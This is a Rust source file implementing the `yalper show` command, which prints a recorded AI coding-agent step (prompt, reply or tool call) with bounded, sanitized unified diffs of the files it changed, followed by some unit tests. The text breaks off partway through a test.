//! `yalper show <step>`: one recorded step in full: the prompt, reply or tool call (input and output, as
//! stored, so already redacted), then the files the step changed, with a unified diff of each changed or
//! added text file.
//!
//! The files a step changed are the difference between its snapshot and the tree that snapshot was built
//! from, both kept with the step (`tree_id` and `base_tree_id`), so a change made by a shell command shows up
//! like an edit, and the list always matches the step's number of files changed.
//!
//! [`write_step`] is the same rendering for other commands: `yalper bisect` shows the step that broke the tests
//! with the prompt that led to it ([`prompt_of`]) and the diff between any two trees ([`Changes::Between`]).
//!
//! Everything shown comes from the event log or the snapshot store, which hold what agents and repositories
//! wrote, so every line goes through [`printable`] (tabs are kept in content lines: they move the cursor but
//! cannot start an escape sequence), every path is checked with the rules of [`validate_path`], and every
//! blob is read through the hash-checking reader of the snapshot store. The tree diff, the number of files
//! listed, the size of each file diffed, the content read and the output are capped, so a crafted store
//! cannot make the command run for long, use much memory, or flood the terminal. Nothing is written: the
//! event log is opened for reading only, and no tree is ever written to disk.

use std::fmt::{self, Write as _};
use std::io::{self, Write};
use std::path::Path;

use gix::ObjectId;
use gix_imara_diff::{
    Algorithm, Diff, InternedInput, Interner, Token, UnifiedDiffConfig, UnifiedDiffPrinter,
};
use jiff::tz::TimeZone;
use serde_json::Value;

use crate::hook::HookEvent;
use crate::init::{printable, say};
use crate::log::{
    ELLIPSIS, NOTHING_RECORDED, action, cut_end, cut_start, find, find_session, local_time, plural,
    relative_path, short_id, short_id_chars, takes_snapshot,
};
use crate::repo::{self, YalperDir};
use crate::snapshot::{FileChange, FileKind, ShadowStore, validate_path};
use crate::store::{Event, Store};

/// Without `--full`, a prompt, reply, tool input or output shows at most this many lines.
const MAX_TEXT_LINES: usize = 20;

/// Without `--full`, a line of text or of a diff is cut to this many characters.
pub(crate) const MAX_LINE_CHARS: usize = 200;

/// A tool name, model, end reason or subagent id is cut to this many characters.
const MAX_FIELD_CHARS: usize = 80;

/// Without `--full`, at most this many changed files are listed.
const MAX_LISTED_FILES: usize = 50;

/// The tree diff stops after this many entries (files and directories), even with `--full`.
const MAX_TREE_ENTRIES: usize = 5_000;

/// Lines of context around each change in a diff, as git shows by default.
const CONTEXT_LINES: u32 = 3;

/// Git's test for a binary file: a NUL byte in its first 8,000 bytes.
const BINARY_PROBE_BYTES: usize = 8_000;

/// How much diff is shown: lines and bytes printed and bytes of content read, for all files together, and
/// the largest file diffed. A line diff costs more than linear time on repetitive input (measured: two
/// versions of 10 MiB took 80 s), so each file is capped.
#[derive(Debug, Clone, Copy)]
struct Budget {
    lines: usize,
    bytes: usize,
    read_bytes: usize,
    file_bytes: usize,
    file_lines: usize,
}

const SHORT_BUDGET: Budget = Budget {
    lines: 300,
    bytes: 64 * 1024,
    read_bytes: 32 * 1024 * 1024,
    file_bytes: 1024 * 1024,
    file_lines: 50_000,
};

/// With `--full`: still bounded, so a crafted snapshot store cannot keep the command busy for minutes.
const FULL_BUDGET: Budget = Budget {
    lines: usize::MAX,
    bytes: 32 * 1024 * 1024,
    read_bytes: 256 * 1024 * 1024,
    file_bytes: 4 * 1024 * 1024,
    file_lines: 200_000,
};

/// How `yalper show` shows a step.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Options {
    /// The session whose id starts with this, instead of the most recently active one.
    pub session: Option<String>,
    /// Show whole texts and diffs instead of cutting them short (still within fixed limits).
    pub full: bool,
    /// Color the diff with terminal escape sequences.
    pub color: bool,
}

impl Options {
    fn format(&self) -> Format {
        Format {
            full: self.full,
            color: self.color,
            file_tools_by_path: false,
        }
    }
}

/// How much [`write_step`] shows, and how.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct Format {
    /// Whole texts and diffs instead of cutting them short (still within fixed limits).
    pub full: bool,
    /// Color the diff with terminal escape sequences.
    pub color: bool,
    /// Show a file tool call (Write, Edit, MultiEdit, NotebookEdit) by the path of its file, with its error if it
    /// failed, and leave its input and output to `yalper show`: the diff below already shows what it changed.
    pub file_tools_by_path: bool,
}

/// Shows step `step` of a session of the project around `start` (see [`Options`]), with times in
/// `time_zone`. Returns the message to show when the step cannot be shown: outside a project set up with
/// `yalper init`, no such session or step, or recordings that cannot be read.
pub fn show(
    start: &Path,
    step: u32,
    options: &Options,
    time_zone: &TimeZone,
    out: &mut dyn Write,
) -> Result<(), String> {
    let yalper = find(start, "yalper show")?;
    let failed = |error: crate::store::Error| format!("cannot read the recordings: {error}");
    let store = Store::open_for_reading(&yalper.dir, &yalper.token).map_err(failed)?;
    let sessions = store.sessions().map_err(failed)?;
    if sessions.is_empty() {
        return Err(NOTHING_RECORDED.to_owned());
    }
    let ids: Vec<&str> = sessions.iter().map(|session| session.id.as_str()).collect();
    let id_chars = short_id_chars(&ids);
    let session = match &options.session {
        Some(prefix) => find_session(&sessions, prefix, id_chars)?,
        None => &sessions[0],
    };
    let short = short_id(&session.id, id_chars);
    let steps = store.step_count(&session.id).map_err(failed)?;
    let Some(event) = store.event(&session.id, step).map_err(failed)? else {
        return Err(match steps {
            0 => format!("session {short} has no steps recorded yet."),
            steps => format!(
                "session {short} has no step {step}: its steps are 1 to {steps}. `yalper log` lists them."
            ),
        });
    };
    let roots = project_roots(start, &yalper);
    let view = StepView {
        event: &event,
        session: &short,
        steps,
        prompt: None,
        roots: &roots,
        time_zone,
    };
    write_step(out, &view, Changes::OfStep(&yalper), options.format())
}

/// The project root as found from `start` and as `.yalper/` was opened (canonical on Unix), as `yalper log`
/// tries them: tool paths are absolute, and [`StepView::roots`] makes them relative to the project.
pub fn project_roots(start: &Path, yalper: &YalperDir) -> Vec<String> {
    [repo::find_root(start), yalper.dir.path().parent()]
        .into_iter()
        .flatten()
        .filter_map(|root| root.to_str().map(str::to_owned))
        .collect()
}

/// A step and what [`write_step`] shows with it.
pub struct StepView<'a> {
    pub event: &'a Event,
    /// The short id of the step's session, as `yalper log` shows it.
    pub session: &'a str,
    /// How many steps the session has.
    pub steps: u32,
    /// The prompt that led to a tool step (see [`prompt_of`]), shown before the tool call. Ignored for other
    /// steps.
    pub prompt: Option<&'a Event>,
    /// The project root, as given by [`project_roots`].
    pub roots: &'a [String],
    /// The time zone of the time shown.
    pub time_zone: &'a TimeZone,
}

/// The file changes [`write_step`] shows under a step.
pub enum Changes<'a> {
    /// What the step changed (from its `base_tree_id` to its `tree_id`), read from the snapshot store of this
    /// `.yalper/`. Shown only for a step that takes a snapshot.
    OfStep(&'a YalperDir),
    /// From tree `from` to tree `to` of `shadow`, whichever steps they belong to. Unless `from` is the step's
    /// own base, a file tool's output keeps the file or patch it returned: the diff can hold other steps'
    /// changes to the same file.
    Between {
        shadow: &'a ShadowStore,
        from: ObjectId,
        to: ObjectId,
    },
}

/// The prompt that led to a tool step: the latest prompt before it in its session. `None` for any other
/// step, and for a tool step with no prompt before it.
pub fn prompt_of(store: &Store, event: &Event) -> crate::store::Result<Option<Event>> {
    if !is_tool_call(event) {
        return Ok(None);
    }
    let prompt = HookEvent::UserPromptSubmit.name().unwrap_or_default();
    store.last_event_before(&event.session_id, event.step, prompt)
}

fn is_tool_call(event: &Event) -> bool {
    matches!(
        HookEvent::from_name(&event.kind),
        HookEvent::PostToolUse | HookEvent::PostToolUseFailure
    )
}

/// Writes a step as `yalper show` does: a header line, the prompt that led to it (if given, for a tool step),
/// what the step was (a prompt, a reply, the start or end of the session, or a tool call with its input and
/// output, unless [`Format::file_tools_by_path`] says otherwise), then the file changes `changes`, listed with a
/// unified diff of each changed or added text file.
/// Returns the message to show when the snapshots cannot be read, after writing what could be shown.
pub fn write_step(
    out: &mut dyn Write,
    view: &StepView<'_>,
    changes: Changes<'_>,
    format: Format,
) -> Result<(), String> {
    let event = view.event;
    let time = local_time(event.ts_ms, view.time_zone).map_or_else(
        || "at an unknown time".to_owned(),
        |time| time.strftime("%Y-%m-%d %H:%M:%S").to_string(),
    );
    say(
        out,
        &printable(&format!(
            "Session {}, step {} of {}, {time}",
            view.session, event.step, view.steps
        )),
    );
    // The files section comes last but is built first: a file tool's output repeats the file or its patch,
    // which is left out only when the diff of that file is shown below and holds only this step's changes.
    let only_this_step = match &changes {
        Changes::OfStep(_) => true,
        Changes::Between { from, .. } => {
            let base = event.base_tree_id.as_deref();
            base.and_then(|hex| ObjectId::from_hex(hex.as_bytes()).ok()) == Some(*from)
        }
    };
    let mut files = Vec::new();
    let diffed = match changes {
        Changes::OfStep(yalper) if takes_snapshot(&event.kind) => {
            Some(write_files(&mut files, yalper, event, format))
        }
        Changes::OfStep(_) => None,
        Changes::Between { shadow, from, to } => {
            Some(write_tree_diff(&mut files, shadow, from, to, format))
        }
    };
    let shown_by_diff = match (&diffed, edited_file(event)) {
        (Some(Ok(diffed)), Some(edited)) if only_this_step => {
            diffed.contains(&relative_path(edited, view.roots))
        }
        _ => false,
    };
    if let Some(prompt) = view.prompt.filter(|_| is_tool_call(event)) {
        let text = prompt.payload.get("prompt").and_then(Value::as_str);
        text_block(
            out,
            &format!("Prompt (step {})", prompt.step),
            text,
            format.full,
        );
        say(out, "");
    }
    let by_path =
        file_tool_path(event).filter(|_| format.file_tools_by_path && is_tool_call(event));
    match by_path {
        Some(path) => write_file_tool(out, view, path, format.full),
        None => write_event(out, event, format.full, shown_by_diff),
    }
    let Some(diffed) = diffed else {
        return Ok(());
    };
    say(out, "");
    let _ = out.write_all(&files);
    diffed.map(|_| ())
}

/// The tools that edit one file, whose response holds that file or its patch, and the input key naming it.
const FILE_TOOLS: [(&str, &str); 4] = [
    ("Edit", "file_path"),
    ("MultiEdit", "file_path"),
    ("Write", "file_path"),
    ("NotebookEdit", "notebook_path"),
];

/// The path of the file a successful file tool call (see [`FILE_TOOLS`]) edited, as the agent gave it.
fn edited_file(event: &Event) -> Option<&str> {
    file_tool_path(event).filter(|_| event.success == Some(true))
}

/// The path of the file a file tool call (see [`FILE_TOOLS`]) was given, whether it succeeded or not.
fn file_tool_path(event: &Event) -> Option<&str> {
    let tool = event.tool_name.as_deref()?;
    let (_, key) = FILE_TOOLS.iter().find(|(name, _)| *name == tool)?;
    event.payload.get("tool_input")?.get(key)?.as_str()
}

/// Writes a file tool call by the path of its file (relative to the project when inside it), its error if it
/// failed, and the command that shows its full input and output.
fn write_file_tool(out: &mut dyn Write, view: &StepView<'_>, path: &str, full: bool) {
    let event = view.event;
    let path = cut_start(&printable(&relative_path(path, view.roots)), MAX_LINE_CHARS);
    let label = format!("{} {path}", field(&action(event)));
    say(out, &printable(&tool_line(event, label)));
    let step = event.step.to_string();
    let command = show_command(&step, Some(view.session), "shows its full input and output");
    say(out, &printable(&command));
    if event.success == Some(false) {
        let error = event.payload.get("error").and_then(Value::as_str);
        text_block(out, "Error", error, full);
    }
}

/// The sentence `` `yalper show <step> --session <id>` <what>. ``, a command to copy. The session's short id is
/// in it only when it is made of ASCII letters, digits and `-`, and was not cut: session ids come from the agent,
/// so one could hold text a shell would run. Otherwise, or without `session`, the command says `<session>` and
/// where to find the id.
pub(crate) fn show_command(step: &str, session: Option<&str>, what: &str) -> String {
    let copyable = session.filter(|id| {
        !id.is_empty()
            && id
                .chars()
                .all(|char| char.is_ascii_alphanumeric() || char == '-')
    });
    match copyable {
        Some(id) => format!("`yalper show {step} --session {id}` {what}."),
        None => format!(
            "`yalper show {step} --session <session>` {what}; `yalper log --all` lists the sessions."
        ),
    }
}

/// Writes what the step was: a prompt, a reply, the start or end of the session, or a tool call with its
/// input and output. `shown_by_diff`: the diff below shows the file a file tool edited (see [`edited_file`]).
fn write_event(out: &mut dyn Write, event: &Event, full: bool, shown_by_diff: bool) {
    let text = |key: &str| event.payload.get(key).and_then(Value::as_str);
    match HookEvent::from_name(&event.kind) {
        HookEvent::SessionStart => {
            let mut line = "Session started".to_owned();
            if let Some(source) = text("source") {
                line.push_str(&format!(" ({})", field(source)));
            }
            if let Some(model) = text("model") {
                line.push_str(&format!(", model {}", field(model)));
            }
            say(out, &printable(&line));
        }
        HookEvent::UserPromptSubmit => text_block(out, "Prompt", text("prompt"), full),
        HookEvent::Stop => text_block(out, "Reply", text("last_assistant_message"), full),
        HookEvent::SessionEnd => {
            let line = match text("reason") {
                Some(reason) => format!("Session ended ({})", field(reason)),
                None => "Session ended".to_owned(),
            };
            say(out, &printable(&line));
        }
        HookEvent::PostToolUse | HookEvent::PostToolUseFailure => {
            write_tool_call(out, event, full, shown_by_diff)
        }
        HookEvent::Other(kind) => say(out, &printable(&kind)),
    }
}

/// `label` followed by how the tool call ended and, for a subagent's, which subagent made it: `Edit, succeeded
/// in 12 ms`.
fn tool_line(event: &Event, mut line: String) -> String {
    let payload = &event.payload;
    let duration = payload
        .get("duration_ms")
        .and_then(Value::as_u64)
        .map(duration);
    match (event.success, &duration) {
        (Some(false), _) => {
            line.push_str(", FAILED");
            if payload.get("is_interrupt").and_then(Value::as_bool) == Some(true) {
                line.push_str(" (interrupted)");
            }
            if let Some(duration) = duration {
                line.push_str(&format!(" after {duration}"));
            }
        }
        (_, Some(duration)) => line.push_str(&format!(", succeeded in {duration}")),
        (_, None) => line.push_str(", succeeded"),
    }
    if let Some(agent) = &event.agent_id {
        line.push_str(&format!(", subagent {}", field(agent)));
    }
    line
}

fn write_tool_call(out: &mut dyn Write, event: &Event, full: bool, shown_by_diff: bool) {
    let payload = &event.payload;
    say(out, &printable(&tool_line(event, field(&action(event)))));

    let input = payload.get("tool_input");
    let command = input
        .and_then(|input| input.get("command"))
        .and_then(Value::as_str);
    let is_shell = matches!(event.tool_name.as_deref(), Some("Bash" | "PowerShell"));
    match (command, input) {
        (Some(command), _) if is_shell => text_block(out, "Command", Some(command), full),
        (_, Some(input)) => json_block(out, "Input", input, full),
        (_, None) => {}
    }

    if event.success == Some(false) {
        let error = payload.get("error").and_then(Value::as_str);
        text_block(out, "Error", error, full);
        return;
    }
    match payload.get("tool_response") {
        // A shell's response: its output streams as text, without the flags around them.
        Some(response) if response.get("stdout").is_some_and(Value::is_string) => {
            let stream = |key: &str| response.get(key).and_then(Value::as_str);
            text_block(out, "Output", stream("stdout"), full);
            if let Some(stderr) = stream("stderr").filter(|text| !text.trim().is_empty()) {
                text_block(out, "Error output", Some(stderr), full);
            }
        }
        Some(Value::String(text)) => text_block(out, "Output", Some(text), full),
        Some(Value::Object(response)) if shown_by_diff => {
            // The file tool's response repeats the whole file or the patch, which the diff below shows.
            let mut response = response.clone();
            for key in DIFF_DUPLICATE_KEYS {
                response.shift_remove(key);
            }
            json_block(out, "Output", &Value::Object(response), full);
        }
        Some(response) => json_block(out, "Output", response, full),
        None => {}
    }
}

/// The keys of a file tool's response left out of its Output block when the diff of its file is shown: the
/// file content or patch that Edit, Write and similar tools return.
const DIFF_DUPLICATE_KEYS: [&str; 3] = ["originalFile", "structuredPatch", "content"];

/// A short value shown inside a line (a tool name, a model, an end reason), made printable and cut to
/// [`MAX_FIELD_CHARS`] characters.
fn field(text: &str) -> String {
    cut_end(&printable(text), MAX_FIELD_CHARS, false)
}

/// `ms` milliseconds, as `87 ms` or `4.2 s`.
fn duration(ms: u64) -> String {
    if ms < 1_000 {
        format!("{ms} ms")
    } else {
        format!("{}.{} s", ms / 1_000, ms % 1_000 / 100)
    }
}

/// `value` as indented JSON, in a block like [`text_block`].
fn json_block(out: &mut dyn Write, heading: &str, value: &Value, full: bool) {
    let json = serde_json::to_string_pretty(value).unwrap_or_default();
    text_block(out, heading, Some(&json), full);
}

/// A blank line, `heading:`, then `text` indented, cut to [`MAX_TEXT_LINES`] lines of at most
/// [`MAX_LINE_CHARS`] characters unless `full`.
fn text_block(out: &mut dyn Write, heading: &str, text: Option<&str>, full: bool) {
    say(out, "");
    let Some(text) = text.filter(|text| !text.trim().is_empty()) else {
        say(out, &format!("{heading}: (none)"));
        return;
    };
    say(out, &format!("{heading}:"));
    let lines: Vec<&str> = text.trim_end().lines().collect();
    let shown = if full {
        lines.len()
    } else {
        lines.len().min(MAX_TEXT_LINES)
    };
    for line in &lines[..shown] {
        let line = if full {
            (*line).to_owned()
        } else {
            cut_end(line, MAX_LINE_CHARS, false)
        };
        say(out, &format!("  {}", content(&line)));
    }
    if shown < lines.len() {
        let more = lines.len() - shown;
        say(
            out,
            &format!(
                "  {ELLIPSIS} {more} more line{} (--full shows all)",
                plural(more)
            ),
        );
    }
}

/// `text` made printable like [`printable`], except that tabs are kept.
pub(crate) fn content(text: &str) -> String {
    text.split('\t')
        .map(printable)
        .collect::<Vec<_>>()
        .join("\t")
}

/// Writes the files the step changed (see [`write_tree_diff`]), or why they cannot be shown.
fn write_files(
    out: &mut dyn Write,
    yalper: &YalperDir,
    event: &Event,
    format: Format,
) -> Result<Vec<String>, String> {
    let Some(tree) = &event.tree_id else {
        say(
            out,
            "No snapshot was recorded for this step (taking it failed, see .yalper/errors.log). Its file \
             changes are in the next step that has a snapshot.",
        );
        return Ok(Vec::new());
    };
    let Some(base) = &event.base_tree_id else {
        // Steps recorded before Yalper kept each step's base.
        match event.files_changed {
            Some(0) => say(out, "No files changed."),
            _ => say(
                out,
                "The snapshot before this step is not known, so its file changes cannot be shown.",
            ),
        }
        return Ok(Vec::new());
    };
    let (tree, base) = (tree_id(tree)?, tree_id(base)?);
    if base == tree {
        say(out, "No files changed.");
        return Ok(Vec::new());
    }
    let shadow = match ShadowStore::open(&yalper.dir, &yalper.token) {
        Ok(shadow) => shadow,
        Err(crate::snapshot::Error::Io(error)) if error.kind() == io::ErrorKind::NotFound => {
            say(out, NOT_AVAILABLE);
            return Ok(Vec::new());
        }
        Err(error) => return Err(snapshots_failed(error)),
    };
    write_tree_diff(out, &shadow, base, tree, format)
}

/// Shown when the snapshot store does not have a tree to diff.
const NOT_AVAILABLE: &str = "Snapshot not available: the snapshot store no longer has the snapshots of this \
                             step (it was lost and created again since).";

fn snapshots_failed(error: crate::snapshot::Error) -> String {
    format!("cannot read the snapshots: {error}")
}

/// Writes the files changed from tree `from` to tree `to` of `shadow`, whichever steps they belong to: a
/// list, then a unified diff of each changed or added text file, one file at a time, within the limits of
/// `format`. Returns the paths, as stored in the tree, of the files whose whole diff was written.
pub fn write_tree_diff(
    out: &mut dyn Write,
    shadow: &ShadowStore,
    from: ObjectId,
    to: ObjectId,
    format: Format,
) -> Result<Vec<String>, String> {
    if from == to {
        say(out, "No files changed.");
        return Ok(Vec::new());
    }
    if !shadow.has_object(to) || !shadow.has_object(from) {
        say(out, NOT_AVAILABLE);
        return Ok(Vec::new());
    }
    let changes = shadow
        .file_changes(from, to, MAX_TREE_ENTRIES)
        .map_err(snapshots_failed)?;
    let count = changes.files.len();
    let listed = if format.full {
        count
    } else {
        count.min(MAX_LISTED_FILES)
    };
    let files: Vec<ListedFile> = changes.files[..listed]
        .iter()
        .map(ListedFile::new)
        .collect();

    say(
        out,
        &if changes.complete {
            format!("{count} file{} changed:", plural(count))
        } else {
            format!("More files changed than Yalper lists. The first {count}:")
        },
    );
    for file in &files {
        let note = file
            .note
            .map(|note| format!(" ({note})"))
            .unwrap_or_default();
        say(out, &format!("  {:<8}  {}{note}", file.verb, file.path));
    }
    if listed < count {
        let more = count - listed;
        say(
            out,
            &format!(
                "  {ELLIPSIS} {more} more file{} (--full lists all)",
                plural(more)
            ),
        );
    }

    let budget = if format.full {
        FULL_BUDGET
    } else {
        SHORT_BUDGET
    };
    let mut writer = DiffWriter {
        out,
        color: format.color,
        full: format.full,
        budget,
        truncated: false,
        diffed: Vec::new(),
    };
    for file in &files {
        if !file.diffed {
            continue;
        }
        if !writer.file(shadow, file).map_err(snapshots_failed)? {
            break;
        }
    }
    if writer.truncated {
        let marker = if format.full {
            format!("{ELLIPSIS} diff truncated: it is larger than Yalper shows")
        } else {
            format!("{ELLIPSIS} diff truncated (--full shows more)")
        };
        say(writer.out, &marker);
    }
    Ok(writer.diffed)
}

/// A tree id read from the event log.
fn tree_id(hex: &str) -> Result<ObjectId, String> {
    ObjectId::from_hex(hex.as_bytes()).map_err(|_| {
        format!(
            "the event log holds an invalid snapshot id: {}",
            printable(&cut_end(hex, 64, false))
        )
    })
}

/// A changed file, as listed.
struct ListedFile {
    verb: &'static str,
    /// Made printable.
    path: String,
    /// As stored in the tree (lossy if not UTF-8).
    relative: String,
    note: Option<&'static str>,
    /// The blobs to diff: none before an added file.
    old: Option<ObjectId>,
    new: Option<ObjectId>,
    /// Whether its content is shown as a diff: an added file, or a modified one whose content changed and
    /// that did not turn into or out of a symlink. Never for an invalid path.
    diffed: bool,
}

impl ListedFile {
    fn new(change: &FileChange) -> Self {
        let (verb, note) = match (change.old, change.new) {
            (None, _) => ("added", None),
            (_, None) => ("deleted", None),
            (Some(old), Some(new)) => ("modified", kind_change(old.kind, new.kind)),
        };
        let mut file = Self {
            verb,
            path: printable(&String::from_utf8_lossy(&change.path)),
            relative: String::from_utf8_lossy(&change.path).into_owned(),
            note,
            old: change.old.map(|old| old.blob),
            new: change.new.map(|new| new.blob),
            diffed: false,
        };
        let Ok(path) = std::str::from_utf8(&change.path) else {
            file.note = Some("not valid UTF-8, not shown");
            return file;
        };
        let kind = change
            .new
            .or(change.old)
            .map_or(FileKind::Regular, |file| file.kind);
        if validate_path(path, kind).is_err() {
            file.note = Some("not a valid path on this system, not shown");
            return file;
        }
        file.diffed = match (change.old, change.new) {
            (None, Some(_)) => true,
            (Some(old), Some(new)) => {
                old.blob != new.blob
                    && (old.kind == FileKind::Symlink) == (new.kind == FileKind::Symlink)
            }
            _ => false,
        };
        file
    }
}

/// What changed in how a file is stored, if anything.
fn kind_change(old: FileKind, new: FileKind) -> Option<&'static str> {
    use FileKind::{Executable, Regular, Symlink};
    match (old, new) {
        (Regular, Executable) => Some("now executable"),
        (Executable, Regular) => Some("no longer executable"),
        (Regular | Executable, Symlink) => Some("now a symlink"),
        (Symlink, Regular | Executable) => Some("no longer a symlink"),
        _ => None,
    }
}

fn is_binary(bytes: &[u8]) -> bool {
    bytes[..bytes.len().min(BINARY_PROBE_BYTES)].contains(&0)
}

/// Terminal colors of a diff, used only when [`Options::color`] is on.
#[derive(Clone, Copy)]
enum Style {
    Header,
    Hunk,
    Added,
    Removed,
    Plain,
}

impl Style {
    fn code(self) -> &'static str {
        match self {
            Self::Header => "\u{1b}[1m",
            Self::Hunk => "\u{1b}[36m",
            Self::Added => "\u{1b}[32m",
            Self::Removed => "\u{1b}[31m",
            Self::Plain => "",
        }
    }
}

/// Writes unified diffs within a [`Budget`].
struct DiffWriter<'a> {
    out: &'a mut dyn Write,
    color: bool,
    full: bool,
    budget: Budget,
    /// The budget ran out: the diff shown is cut.
    truncated: bool,
    /// The paths, as stored in the tree, of the files whose whole diff was written.
    diffed: Vec<String>,
}

impl DiffWriter<'_> {
    /// Reads the content of `file`, diffs it and writes the diff, or a one-line note when it is binary, too
    /// large to diff, or missing from the store. Returns `false` once the budget ran out.
    fn file(&mut self, shadow: &ShadowStore, file: &ListedFile) -> crate::snapshot::Result<bool> {
        let old = match file.old {
            Some(id) => self.read(shadow, id)?,
            None => Content::Text(Vec::new()),
        };
        let new = match file.new {
            Some(id) => self.read(shadow, id)?,
            None => Content::Text(Vec::new()),
        };
        if self.truncated {
            return Ok(false);
        }
        let note = match (old, new) {
            (Content::Missing, _) | (_, Content::Missing) => "content not available",
            (Content::TooLarge, _) | (_, Content::TooLarge) => "too large to diff",
            (Content::Text(old), Content::Text(new)) if is_binary(&old) || is_binary(&new) => {
                if file.old.is_some() {
                    "binary file changed"
                } else {
                    "binary file added"
                }
            }
            (Content::Text(old), Content::Text(new)) => {
                let lines = |bytes: &[u8]| bytes.iter().filter(|&&byte| byte == b'\n').count();
                if lines(&old).max(lines(&new)) > self.budget.file_lines {
                    "too large to diff"
                } else {
                    let whole = self.diff(&file.path, file.old.is_some(), &old, &new);
                    if whole {
                        self.diffed.push(file.relative.clone());
                    }
                    return Ok(whole);
                }
            }
        };
        Ok(self.line(Style::Plain, "")
            && self.line(Style::Plain, &format!("{}: {note}", file.path)))
    }

    /// The content of blob `id`, within the budget: what is read counts against the total read budget, and
    /// a blob larger than the per-file limit is not diffed.
    fn read(&mut self, shadow: &ShadowStore, id: ObjectId) -> crate::snapshot::Result<Content> {
        if self.budget.read_bytes == 0 {
            self.truncated = true;
            return Ok(Content::TooLarge);
        }
        let Some(bytes) = shadow.read_blob(id)? else {
            return Ok(Content::Missing);
        };
        self.budget.read_bytes = self.budget.read_bytes.saturating_sub(bytes.len());
        if bytes.len() > self.budget.file_bytes {
            return Ok(Content::TooLarge);
        }
        Ok(Content::Text(bytes))
    }

    /// Writes the diff of the file at `path` (already printable) from `old` to `new`; an added file
    /// (`!existed`) is diffed against nothing. Returns `false` once the budget ran out.
    fn diff(&mut self, path: &str, existed: bool, old: &[u8], new: &[u8]) -> bool {
        let old_path = if existed {
            format!("--- a/{path}")
        } else {
            "--- /dev/null".to_owned()
        };
        if !self.line(Style::Plain, "")
            || !self.line(Style::Header, &old_path)
            || !self.line(Style::Header, &format!("+++ b/{path}"))
        {
            return false;
        }
        let input = InternedInput::new(old, new);
        let mut diff = Diff::compute(Algorithm::Histogram, &input);
        diff.postprocess_lines(&input);
        let printer = Printer(&input.interner);
        let mut config = UnifiedDiffConfig::default();
        config.context_len(CONTEXT_LINES);
        let mut lines = Lines {
            writer: self,
            pending: String::new(),
        };
        // An error only means the budget ran out, which `truncated` already says.
        let _ = write!(lines, "{}", diff.unified_diff(&printer, config, &input));
        !self.truncated
    }

    /// Writes one line of the diff: `text` made printable (tabs kept), cut to [`MAX_LINE_CHARS`] characters
    /// unless `full`, and colored with `style` if colors are on. Returns `false`, and writes nothing, once
    /// the budget ran out.
    fn line(&mut self, style: Style, text: &str) -> bool {
        let text = if self.full {
            content(text)
        } else {
            content(&cut_end(text, MAX_LINE_CHARS, false))
        };
        let bytes = text.len() + 1;
        if self.truncated || self.budget.lines == 0 || self.budget.bytes < bytes {
            self.truncated = true;
            return false;
        }
        self.budget.lines -= 1;
        self.budget.bytes -= bytes;
        let (start, end) = match style {
            Style::Plain => ("", ""),
            _ if !self.color => ("", ""),
            style => (style.code(), "\u{1b}[0m"),
        };
        let _ = writeln!(self.out, "{start}{text}{end}");
        true
    }
}

/// The content of one side of a diff.
enum Content {
    Text(Vec<u8>),
    TooLarge,
    /// The store does not have the blob.
    Missing,
}

/// Formats the hunks of a diff as unified diff lines, each starting with its marker (`@`, ` `, `-`, `+`,
/// `\`), which [`Lines`] turns into the style of the line.
struct Printer<'a>(&'a Interner<&'a [u8]>);

impl Printer<'_> {
    fn token(&self, mut f: impl fmt::Write, marker: char, token: Token) -> fmt::Result {
        let text = String::from_utf8_lossy(self.0[token]);
        match text.strip_suffix('\n') {
            Some(line) => writeln!(f, "{marker}{line}"),
            None => writeln!(f, "{marker}{text}\n\\ No newline at end of file"),
        }
    }
}

impl UnifiedDiffPrinter for Printer<'_> {
    fn display_header(
        &self,
        mut f: impl fmt::Write,
        start_before: u32,
        start_after: u32,
        len_before: u32,
        len_after: u32,
    ) -> fmt::Result {
        // Like git: the first line of each side, counted from 1, or the line before an empty side.
        let start = |start: u32, len: u32| if len == 0 { start } else { start + 1 };
        writeln!(
            f,
            "@@ -{},{len_before} +{},{len_after} @@",
            start(start_before, len_before),
            start(start_after, len_after)
        )
    }

    fn display_context_token(&self, f: impl fmt::Write, token: Token) -> fmt::Result {
        self.token(f, ' ', token)
    }

    fn display_hunk(
        &self,
        mut f: impl fmt::Write,
        before: &[Token],
        after: &[Token],
    ) -> fmt::Result {
        for &token in before {
            self.token(&mut f, '-', token)?;
        }
        for &token in after {
            self.token(&mut f, '+', token)?;
        }
        Ok(())
    }
}

/// Receives the text of a unified diff and writes it line by line through [`DiffWriter::line`], styled by
/// each line's marker. Fails once the budget ran out, which stops the diff.
struct Lines<'a, 'b> {
    writer: &'a mut DiffWriter<'b>,
    pending: String,
}

impl fmt::Write for Lines<'_, '_> {
    fn write_str(&mut self, mut text: &str) -> fmt::Result {
        while let Some(end) = text.find('\n') {
            self.pending.push_str(&text[..end]);
            let line = std::mem::take(&mut self.pending);
            let style = match line.chars().next() {
                Some('@') => Style::Hunk,
                Some('+') => Style::Added,
                Some('-') => Style::Removed,
                _ => Style::Plain,
            };
            if !self.writer.line(style, &line) {
                return Err(fmt::Error);
            }
            text = &text[end + 1..];
        }
        self.pending.push_str(text);
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::repo::Token;
    use crate::safe_fs::OwnedDir;
    use crate::snapshot::TreeFile;

    fn block(text: &str, full: bool) -> String {
        let mut out = Vec::new();
        text_block(&mut out, "Output", Some(text), full);
        String::from_utf8(out).unwrap()
    }

    #[test]
    fn long_texts_are_cut_unless_full() {
        let text: String = (1..=25).map(|n| format!("line {n}\n")).collect();
        let short = block(&text, false);
        assert!(short.starts_with("\nOutput:\n  line 1\n"), "{short}");
        assert!(
            short.ends_with("  line 20\n  ... 5 more lines (--full shows all)\n"),
            "{short}"
        );
        let full = block(&text, true);
        assert!(full.ends_with("  line 25\n"), "{full}");

        let long_line = "x".repeat(MAX_LINE_CHARS + 50);
        let short = block(&long_line, false);
        let shown = format!(
            "  {}{ELLIPSIS}\n",
            "x".repeat(MAX_LINE_CHARS - ELLIPSIS.len())
        );
        assert!(short.ends_with(&shown), "{short}");
        assert!(block(&long_line, true).ends_with(&format!("  {long_line}\n")));

        assert_eq!(block(" \n ", false), "\nOutput: (none)\n");
        assert_eq!(block("a\tb\u{1b}[31m", false), "\nOutput:\n  a\tb [31m\n");
    }

    #[test]
    fn durations_and_kind_changes_read_naturally() {
        assert_eq!(duration(0), "0 ms");
        assert_eq!(duration(999), "999 ms");
        assert_eq!(duration(4187), "4.1 s");
        assert_eq!(duration(61_000), "61.0 s");
        use FileKind::{Executable, Regular, Symlink};
        assert_eq!(kind_change(Regular, Executable), Some("now executable"));
